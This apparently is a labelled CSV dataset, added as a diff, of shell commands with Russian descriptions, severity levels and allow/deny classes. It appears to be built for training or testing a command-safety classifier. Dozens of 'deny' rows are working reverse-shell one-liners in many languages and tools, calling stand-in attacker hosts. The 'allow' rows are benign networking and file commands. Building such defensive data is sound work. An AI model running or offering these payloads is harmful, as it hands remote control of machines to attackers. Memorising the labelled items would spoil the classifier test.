@@ -1,0 +1,288 @@
+command,description,util,severity,category,risk,source,seed,class
+/bin/bash -i >& /dev/tcp/198.51.100.52/4444 0>&1,Подключает потоки Bash к исходящему TCP-соединению для удалённого управления.,bash,critical,CAT-5,CAT-5.2,real,-,deny
+bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1',Подключает потоки Bash к исходящему TCP-соединению для удалённого управления.,bash,critical,CAT-5,CAT-5.2,real,-,deny
+/bin/bash -i >& /dev/udp/198.51.100.52/4444 0>&1,Подключает потоки Bash к исходящему UDP-сокету для удалённого управления.,bash,critical,CAT-5,CAT-5.2,real,-,deny
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 198.51.100.52 4444 >/tmp/f,Связывает Bash с исходящим соединением netcat через именованный канал для удалённого выполнения команд.,nc,critical,CAT-5,CAT-5.2,real,-,deny
+nc 198.51.100.52 4444 -e /bin/bash,"Запускает оболочку с потоками, подключёнными к исходящему соединению netcat.",nc,critical,CAT-5,CAT-5.2,real,-,deny
+nc -c /bin/bash 198.51.100.52 4444,"Запускает оболочку с потоками, подключёнными к исходящему соединению netcat.",nc,critical,CAT-5,CAT-5.2,real,-,deny
+nc -e /bin/sh attacker.com 12345,"Запускает оболочку с потоками, подключёнными к исходящему соединению netcat.",nc,critical,CAT-5,CAT-5.2,real,-,deny
+ncat 198.51.100.52 4444 -e /bin/bash,Передаёт управление локальной оболочкой удалённой стороне исходящего соединения Ncat.,ncat,critical,CAT-5,CAT-5.2,real,-,deny
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u 198.51.100.52 4444 >/tmp/f,Связывает Bash с исходящим UDP-соединением Ncat через именованный канал для удалённого выполнения команд.,ncat,critical,CAT-5,CAT-5.2,real,-,deny
+mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 198.51.100.52:4444 > /tmp/s; rm /tmp/s,Связывает интерактивный Bash с исходящим TLS-соединением через OpenSSL и именованный канал.,openssl,critical,CAT-5,CAT-5.2,real,-,deny
+"perl -e 'use Socket;$i=""198.51.100.52"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");};'",Подключает стандартные потоки оболочки к исходящему сокету Perl для удалённого управления.,perl,critical,CAT-5,CAT-5.2,real,-,deny
+"perl -e 'use Socket;$i=""attacker.com"";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",Подключает стандартные потоки оболочки к исходящему сокету Perl для удалённого управления.,perl,critical,CAT-5,CAT-5.2,real,-,deny
+"php -r '$sock=fsockopen(""198.51.100.52"",4444);exec(""/bin/bash <&3 >&3 2>&3"");'",Запускает оболочку на файловом дескрипторе исходящего сокета PHP для удалённого управления.,php,critical,CAT-5,CAT-5.2,real,-,deny
+"php -r '$sock=fsockopen(""198.51.100.52"",4444);system(""/bin/bash <&3 >&3 2>&3"");'",Запускает оболочку на файловом дескрипторе исходящего сокета PHP для удалённого управления.,php,critical,CAT-5,CAT-5.2,real,-,deny
+"php -r '$s=fsockopen(""198.51.100.52"",4444);proc_open(""/bin/bash"",[$s,$s,$s],$p);'","Запускает Bash, явно направляя его стандартные потоки в исходящее соединение PHP.",php,critical,CAT-5,CAT-5.2,real,-,deny
+"export RHOST=""198.51.100.52"";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/bash"")'",Перенаправляет стандартные потоки Python в исходящий TCP-сокет и запускает Bash в псевдотерминале.,python3,critical,CAT-5,CAT-5.2,real,-,deny
+"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""198.51.100.52"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/bin/bash"")'",Перенаправляет стандартные потоки Python в исходящий TCP-сокет и запускает Bash в псевдотерминале.,python3,critical,CAT-5,CAT-5.2,real,-,deny
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((""198.51.100.52"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(""/bin/bash"")'",Перенаправляет стандартные потоки Python в исходящий TCP-сокет и запускает Bash в псевдотерминале.,python3,critical,CAT-5,CAT-5.2,real,-,deny
+"ruby -rsocket -e'spawn(""sh"",[:in,:out,:err]=>TCPSocket.new(""198.51.100.52"",4444))'","Запускает оболочку Ruby с потоками, подключёнными к исходящему TCP-сокету.",ruby,critical,CAT-5,CAT-5.2,real,-,deny
+"ruby -rsocket -e'exit if fork;c=TCPSocket.new(""198.51.100.52"",""4444"");loop{c.gets.chomp!;(exit! if $_==""exit"");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts ""failed: #{$_}""}'","Читает команды из исходящего TCP-соединения, исполняет их через Ruby и возвращает вывод удалённой стороне.",ruby,critical,CAT-5,CAT-5.2,real,-,deny
+"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(""attacker.com"",12345);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","Читает команды из исходящего TCP-соединения, исполняет их через Ruby и возвращает вывод удалённой стороне.",ruby,critical,CAT-5,CAT-5.2,real,-,deny
+socat TCP:198.51.100.52:4444 EXEC:/bin/bash,Подключает локальную оболочку к исходящему TCP-соединению socat для удалённого управления.,socat,critical,CAT-5,CAT-5.2,real,-,deny
+"socat TCP:198.51.100.52:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",Подключает локальную оболочку к исходящему TCP-соединению socat для удалённого управления.,socat,critical,CAT-5,CAT-5.2,real,-,deny
+"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",Подключает локальную оболочку к исходящему TCP-соединению socat для удалённого управления.,socat,critical,CAT-5,CAT-5.2,real,-,deny
+"node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
+require(""net"").connect(12345, ""attacker.com"", function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+})'","Запускает оболочку Node.js и связывает её ввод, вывод и ошибки с исходящим TCP-сокетом.",node,critical,CAT-5,CAT-5.2,real,-,deny
+zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY',Открывает исходящий TCP-сокет модулем Zsh и подключает к нему потоки дочерней оболочки.,zsh,critical,CAT-5,CAT-5.2,real,-,deny
+"lua -e '
+  local s=require(""socket"");
+  local t=assert(s.tcp());
+  t:connect(""attacker.com"",12345);
+  while true do
+    local r,x=t:receive();local f=assert(io.popen(r,""r""));
+    local b=assert(f:read(""*a""));t:send(b);
+  end;
+  f:close();t:close();'","Читает команды из исходящего TCP-соединения Lua, исполняет их и отправляет вывод удалённой стороне.",lua,critical,CAT-5,CAT-5.2,real,-,deny
+"bash -c 'echo ""$(</path/to/input-file)""'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,bash,low,CAT-5,CAT-5.2,real,-,allow
+gawk '//' /path/to/input-file,Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,awk,low,CAT-5,CAT-5.2,real,-,allow
+"lua -e 'local f=io.open(""/path/to/input-file"", ""rb""); io.write(f:read(""*a"")); io.close(f);'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,lua,low,CAT-5,CAT-5.2,real,-,allow
+"node -e 'process.stdout.write(require(""fs"").readFileSync(""/path/to/input-file""))'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,node,low,CAT-5,CAT-5.2,real,-,allow
+perl -ne print /path/to/input-file,Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,perl,low,CAT-5,CAT-5.2,real,-,allow
+"php -r 'readfile(""/path/to/input-file"");'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,php,low,CAT-5,CAT-5.2,real,-,allow
+"python -c 'print(open(""/path/to/input-file"").read())'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,python,low,CAT-5,CAT-5.2,real,-,allow
+"ruby -e 'puts File.read(""/path/to/input-file"")'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,ruby,low,CAT-5,CAT-5.2,real,-,allow
+"zsh -c 'echo ""$(</path/to/input-file)""'",Читает обычный несекретный входной файл и выводит его содержимое локально без сетевого исполнения.,zsh,low,CAT-5,CAT-5.2,real,-,allow
+nc -l -p 12345,Принимает сетевые данные через netcat в стандартный вывод без запуска оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"socat file:/dev/tty,raw,echo=0 tcp-listen:12345",Принимает данные через socat и передаёт их локальному терминалу без запуска команд из сети.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - TCP:10.1.1.1:80	# similar to ""netcat 10.1.1.1 80""",Передаёт данные между локальным вводом-выводом и одним TCP-сервисом без исполнения входящих команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	-,raw,echo=0 \
+	TCP:172.16.181.130:2023",Передаёт данные между локальным вводом-выводом и одним TCP-сервисом без исполнения входящих команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	READLINE \
+	TCP6:[::1]:21	# if your inetd/ftp is listening on ip6",Передаёт данные между локальным вводом-выводом и одним TCP-сервисом без исполнения входящих команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	-,icanon=0,echo=0 \
+	TCP:target:5555; reset",Передаёт данные между локальным вводом-выводом и одним TCP-сервисом без исполнения входящих команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - TCP-LISTEN:25,crlf",Принимает сетевые данные и передаёт их локальному вводу-выводу без исполнения оболочкой.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat READLINE TCP-LISTEN:25,crlf",Принимает сетевые данные и передаёт их локальному вводу-выводу без исполнения оболочкой.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	READLINE \
+	EXEC:""nslookup"",pty,ctty,setsid,echo=0",Связывает локальную строку ввода с фиксированным процессом nslookup без управления оболочкой из сети.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	READLINE,history=.nslookup_hist \
+	EXEC:""nslookup"",pty,ctty,setsid,echo=0",Связывает локальную строку ввода с фиксированным процессом nslookup без управления оболочкой из сети.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat -T 0.1 PIPE PIPE,Создаёт локальный канал socat с ограничением времени без сетевого исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	TCP-LISTEN:8000,crlf \
+	SYSTEM:""echo HTTP/1.0 200; echo Content-Type\: text/plain; echo; cat""","Возвращает фиксированные HTTP-заголовки и передаёт данные через cat, не интерпретируя сетевой ввод как команды.",socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat -u - -,crlf",Преобразует окончания строк локального потока без сети и запуска полученного текста.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat -u -,cr -",Преобразует окончания строк локального потока без сети и запуска полученного текста.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat PIPE STDIO,Возвращает данные через локальный анонимный канал без удалённого запуска команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - PIPE,Возвращает данные через локальный анонимный канал без удалённого запуска команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - PIPE:/tmp/pipi,Связывает локальный поток с именованным каналом без сетевого исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - PIPE:/tmp/pipi,nonblock!!/tmp/pipi",Связывает локальный поток с именованным каналом без сетевого исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - EXEC:/bin/cat,Передаёт данные фиксированному локальному cat без исходящего канала удалённого управления.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - SYSTEM:/bin/cat,Передаёт данные фиксированному локальному cat без исходящего канала удалённого управления.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - TCP:loopback:7,Обменивается данными с локальным echo-сервисом без исполнения команд из сокета.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - UDP:loopback:7,Обменивается данными с локальным echo-сервисом без исполнения команд из сокета.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - UDP:loopback:2000,bind=:2000",Обменивается данными через локальный UDP-сокет без запуска оболочки.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat -u - -,Копирует локальный стандартный поток без сетевого соединения и интерпретации текста.,socat,low,CAT-5,CAT-5.2,real,-,allow
+rm -f /tmp/mysocket; socat UNIX-LISTEN:/tmp/mysocket -,Обменивается данными через локальный Unix-сокет без запуска оболочки из сети.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat UNIX:/tmp/mysocket -,Обменивается данными через локальный Unix-сокет без запуска оболочки из сети.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - EXEC:""filan -s"",nofork",Запускает фиксированную локальную диагностику файловых дескрипторов filan без удалённого управления.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - EXEC:""filan -s"",pipes,stderr",Запускает фиксированную локальную диагностику файловых дескрипторов filan без удалённого управления.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - EXEC:""filan -s"",pty",Запускает фиксированную локальную диагностику файловых дескрипторов filan без удалённого управления.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat -u UDP-RECV:7777,setsockopt-int=1:2:1 -",Принимает UDP-данные в локальный вывод без исполнения полученного текста.,socat,low,CAT-5,CAT-5.2,real,-,allow
+websocat - ws://echo.websocket.org/,Обменивается текстовыми данными с WebSocket-сервисом без запуска полученного текста.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -t ws-l:127.0.0.1:8080 mirror:,Возвращает полученные сетевые данные без запуска оболочки.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat tcp-l:0.0.0.0:1441 mirror:,Возвращает полученные сетевые данные без запуска оболочки.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat ws-l:127.0.0.1:8808 -,Передаёт данные локального WebSocket-listener в стандартные потоки без удалённого исполнения.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat ws-l:tcp-l:127.0.0.1:8808 reuse:-,Передаёт данные локального WebSocket-listener в стандартные потоки без удалённого исполнения.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -E -t --pkcs12-der=q.pkcs12 wss-listen:127.0.0.1:1234 mirror:,Принимает данные через тестовый TLS-listener и возвращает их без исполнения команд.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -E -b --pkcs12-der=q.pkcs12 ssl-listen:127.0.0.1:1234 mirror:,Принимает данные через тестовый TLS-listener и возвращает их без исполнения команд.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat  -b - http://example.com < /dev/null,Выполняет HTTP-запрос и выводит ответ как данные без исполнения.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -Ub - http-request:tcp:example.com:80 --request-uri=http://example.com/ --request-header 'Connection: close',Выполняет HTTP-запрос и выводит ответ как данные без исполнения.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat - tcp:127.0.0.1:22,Обменивается данными с одним локальным TCP-сервисом без подключения оболочки к сокету.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat ws-l:127.0.0.1:8000 readfile:hello.json,Отправляет публичный тестовый JSON-файл через локальный WebSocket без исполнения входящих команд.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat ws-l:127.0.0.1:8000 writefile:data.txt,Записывает полученные данные в обычный тестовый файл без запуска их как кода.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -u -b udp-l:127.0.0.1:1234 lengthprefixed:writefile:test.dat,Записывает полученные данные в обычный тестовый файл без запуска их как кода.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -t -u ws://server/listen_for_updates foreachmsg:writefile:status.txt,Записывает полученные данные в обычный тестовый файл без запуска их как кода.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -u ws-l:127.0.0.1:8000 reuse:appendfile:log.txt,Добавляет входящие данные в обычный тестовый лог без исполнения.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat - unix-dgram:./receiver:./sender,Обменивается данными с локальным Unix datagram-сокетом без запуска оболочки.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat - abstract-dgram:receiver_addr:sender_addr,Обменивается данными с локальным Unix datagram-сокетом без запуска оболочки.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+socat unix-recv:./sender -&,Принимает Unix datagram-данные и выводит их локально без исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"websocat ws-l:0.0.0.0:1234 literalreply:'{""status"":""OK""}'",Возвращает фиксированный JSON через WebSocket без запуска программ по входящим данным.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+"websocat ws-l:127.0.0.1:8080 literal:'{ ""hello"":""world""} '",Возвращает фиксированный JSON через WebSocket без запуска программ по входящим данным.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -t - ws-c:tls-c:tcp:174.129.224.73:1080 --ws-c-uri ws://echo.websocket.org --tls-domain echo.websocket.org,Обменивается данными с WebSocket-сервисом через явно заданный TLS-транспорт без исполнения ответа.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -E ws-l:0.0.0.0:8800 reuse-broadcast:mirror:,Возвращает сетевые сообщения через общий mirror-канал без запуска оболочки.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat - autoreconnect:tcp:127.0.0.1:5445,Переподключается к локальному TCP-сервису для обмена данными без удалённого исполнения.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -u -b lengthprefixed:readfile:test.dat udp:127.0.0.1:1235,Отправляет обычную несекретную тестовую фикстуру по UDP без исполнения данных из сети.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+websocat -b lengthprefixed:- ws://127.0.0.1:1234/ --binary-prefix=B --text-prefix=T,Передаёт текстовые и бинарные сообщения с явным framing без запуска полученного текста.,websocat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat --exec /bin/bash --udp --ping-init 10.0.0.1 4444,"Запускает Bash с потоками, подключёнными к исходящему UDP-каналу pwncat для удалённого управления.",pwncat,critical,CAT-5,CAT-5.2,real,-,deny
+pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444,"Запускает Bash с потоками, подключёнными к исходящему UDP-каналу pwncat для удалённого управления.",pwncat,critical,CAT-5,CAT-5.2,real,-,deny
+pwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444,Подключает Bash к исходящему TCP-соединению pwncat с повторным подключением для удалённого управления.,pwncat,critical,CAT-5,CAT-5.2,real,-,deny
+"printf ""GET / HTTP/1.1\n\n"" | pwncat www.google.com 80",Отправляет фиксированный HTTP-запрос и получает ответ как данные без запуска оболочки.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+"printf ""GET / HTTP/1.1\n\n"" | pwncat www.google.com 80 --no-shutdown",Отправляет фиксированный HTTP-запрос и получает ответ как данные без запуска оболочки.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+"printf ""GET / \n\n"" | pwncat www.google.com 80",Отправляет фиксированный HTTP-запрос и получает ответ как данные без запуска оболочки.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat -l 4444 > output.txt,Принимает данные в обычный тестовый файл без исполнения полученного текста.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat -l 4444 --no-shutdown > output.txt,Принимает данные в обычный тестовый файл без исполнения полученного текста.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat -u -l 4444 > output.txt,Принимает данные в обычный тестовый файл без исполнения полученного текста.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat localhost 4444 < input.txt,Передаёт обычную несекретную тестовую фикстуру локальному сервису без запуска команд.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat localhost 4444 --no-shutdown < input.txt,Передаёт обычную несекретную тестовую фикстуру локальному сервису без запуска команд.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat -u localhost 4444 < input.txt,Передаёт обычную несекретную тестовую фикстуру локальному сервису без запуска команд.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat -l 4445,Принимает сетевые данные стандартными потоками без подключения оболочки.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+pwncat -l -vvv 4444 2> comm.txt,Принимает сетевые данные стандартными потоками без подключения оболочки.,pwncat,low,CAT-5,CAT-5.2,real,-,allow
+nc -l 1234,Принимает сетевые данные через netcat без запуска полученного текста.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -N 127.0.0.1 1234,Обменивается данными с одним локальным сервисом и завершает отправку после EOF без запуска оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -l 1234 > filename.out,Принимает данные в обычную тестовую фикстуру без исполнения сетевого ввода.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -N host.example.com 1234 < filename.in,Отправляет обычную несекретную фикстуру одному документированному сервису без запуска команд.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"printf ""GET / HTTP/1.0\r\n\r\n"" | nc host.example.com 80",Отправляет фиксированный HTTP-запрос через netcat без интерпретации ответа как кода.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -p 31337 -w 5 host.example.com 42,Открывает обычное соединение netcat с заданным исходящим портом и тайм-аутом без запуска shell.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -u host.example.com 53,Обменивается данными с одним UDP-сервисом без запуска оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -s 10.1.2.3 host.example.com 42,Открывает одно TCP-соединение netcat с заданным локальным адресом без удалённого управления.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -lU /var/tmp/dsocket,Принимает данные через локальный Unix-сокет без исполнения команд.,nc,low,CAT-5,CAT-5.2,real,-,allow
+openssl s_client -connect servername:443,Открывает TLS-соединение для обмена данными без подключения оболочки.,openssl,low,CAT-5,CAT-5.2,real,-,allow
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1,Запускает login-оболочку Bash со стандартными потоками на исходящем TCP-сокете для удалённого управления.,bash,critical,CAT-5,CAT-5.2,real,-,deny
+"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,""10.0.0.1:4242"");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","Читает команды из исходящего TCP-соединения Perl, исполняет их и возвращает вывод удалённой стороне.",perl,critical,CAT-5,CAT-5.2,real,-,deny
+"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Связывает стандартные потоки Python с исходящим сокетом и запускает оболочку через subprocess.,python,critical,CAT-5,CAT-5.2,real,-,deny
+"python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4242));subprocess.call([""/bin/sh"",""-i""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'","Запускает оболочку Python subprocess с явными stdin/stdout/stderr, подключёнными к исходящему сокету.",python,critical,CAT-5,CAT-5.2,real,-,deny
+"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((""dead:beef:2::125c"",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/sh"")'",Открывает исходящее IPv6-соединение Python и подключает к нему оболочку через псевдотерминал.,python,critical,CAT-5,CAT-5.2,real,-,deny
+"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1"",""4242"");while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","Читает команды из исходящего TCP-сокета Ruby, исполняет их и возвращает вывод в том же соединении.",ruby,critical,CAT-5,CAT-5.2,real,-,deny
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f,"Связывает оболочку с исходящим соединением netcat через FIFO, созданный mknod.",nc,critical,CAT-5,CAT-5.2,real,-,deny
+ncat --udp 10.0.0.1 4242 -e /bin/bash,Подключает Bash к исходящему UDP-сокету Ncat для удалённого управления.,ncat,critical,CAT-5,CAT-5.2,real,-,deny
+TF=$(mktemp -u);mkfifo $TF && telnet 198.51.100.52 4444 0<$TF | /bin/bash 1>$TF,Связывает ввод и вывод оболочки с исходящим Telnet-соединением через именованный канал.,telnet,critical,CAT-5,CAT-5.2,real,-,deny
+"mkfifo /path/to/temp-socket
+telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket",Связывает ввод и вывод оболочки с исходящим Telnet-соединением через именованный канал.,telnet,critical,CAT-5,CAT-5.2,real,-,deny
+"awk 'BEGIN {s = ""/inet/tcp/0/198.51.100.52/4444""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null","Читает команды из исходящего TCP-сокета GNU Awk, исполняет их через coprocess и отправляет вывод обратно.",awk,critical,CAT-5,CAT-5.2,real,-,deny
+time python -c 'import socket; print(socket.gethostbyname_ex(socket.gethostname())[2])',Запрашивает локальное имя узла и DNS-данные без выполнения команд из сети.,python,low,CAT-5,CAT-5.2,real,-,allow
+cat < /dev/tcp/time-a.nist.gov/13,Читает ответ одного Daytime TCP-сервиса и выводит его как данные без исполнения.,bash,low,CAT-5,CAT-5.2,real,-,allow
+"socat file:$(tty),raw,echo=0 \
+                                   tcp:10.10.10.1:2222",Передаёт данные между локальным терминалом и одним TCP-сервисом без запуска оболочки по сетевому вводу.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"timeout 2 bash -c ""</dev/tcp/moodledb.example.com/80""; echo $?",Проверяет один TCP-порт через Bash с конечным тайм-аутом без запуска команд из сети.,bash,low,CAT-5,CAT-5.2,real,-,allow
+"timeout 1 bash -c ""</dev/tcp/stackoverflow.com/81"" && echo Port open. || echo Port closed.",Проверяет один TCP-порт через Bash с конечным тайм-аутом без запуска команд из сети.,bash,low,CAT-5,CAT-5.2,real,-,allow
+timeout 1 bash -c 'cat < /dev/null > /dev/tcp/google.com/80',Проверяет один TCP-порт через Bash с конечным тайм-аутом без запуска команд из сети.,bash,low,CAT-5,CAT-5.2,real,-,allow
+nc -vz localhost 3306,Проверяет доступность одного TCP-порта без запуска удалённо управляемой оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -z -w1 192.168.1.12 2000 &> /dev/null; echo $?;,Проверяет доступность одного TCP-порта без запуска удалённо управляемой оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -z -v -w5 localhost 8443,Проверяет доступность одного TCP-порта без запуска удалённо управляемой оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc my.example.com 80 < /dev/null,Открывает соединение к одному сервису с пустым stdin без запуска оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -N my.example.com 80 < /dev/null,Открывает соединение к одному сервису с пустым stdin без запуска оболочки.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"perl -MIO::Socket::INET -e 'exit(! defined( IO::Socket::INET->new(""172.17.42.1:3142"")))'",Проверяет создание одного TCP-соединения через Perl и возвращает код результата без исполнения сетевых данных.,perl,low,CAT-5,CAT-5.2,real,-,allow
+export IP=198.51.100.52 PORT=4444; echo bash -i >& /dev/tcp/$IP/$PORT 0>&1,Отправляет буквальные слова bash -i в TCP-сокет без запуска Bash и без исполнения полученного текста.,bash,low,CAT-5,CAT-5.2,real,-,allow
+ncat -U ~/unixsock,Обменивается данными с локальным Unix-сокетом без запуска оболочки.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l -U ~/unixsock,Принимает данные локального Unix-сокета без исполнения команд.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat --vsock 2 1234,Подключается к одному VM socket для обмена данными без удалённого исполнения.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --vsock 1234,Принимает VM socket-данные в стандартные потоки без запуска оболочки.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat example.org 8080,Обменивается данными с одним TCP-сервисом Ncat без запуска оболочки.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l 8080,Принимает TCP-данные Ncat без запуска команд из сети.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+0<&196;exec 196<>/dev/tcp/198.51.100.52/4444; /bin/bash <&196 >&196 2>&196,Открывает двунаправленный TCP-сокет на явном файловом дескрипторе и подключает к нему потоки Bash.,bash,critical,CAT-5,CAT-5.2,real,-,deny
